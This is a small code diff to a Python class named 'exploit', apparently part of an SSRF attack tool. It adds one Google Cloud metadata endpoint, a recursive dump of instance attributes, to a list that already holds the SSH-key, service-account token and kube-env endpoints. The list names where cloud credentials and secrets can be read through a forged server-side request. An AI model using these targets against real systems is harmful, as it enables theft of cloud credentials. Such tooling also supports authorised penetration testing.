@@ -51,3 +51,6 @@ class exploit():
         self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json") )
         self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/service-accounts/default/token") )
         self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/attributes/kube-env?alt=json") )
+        self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json") )
+
+
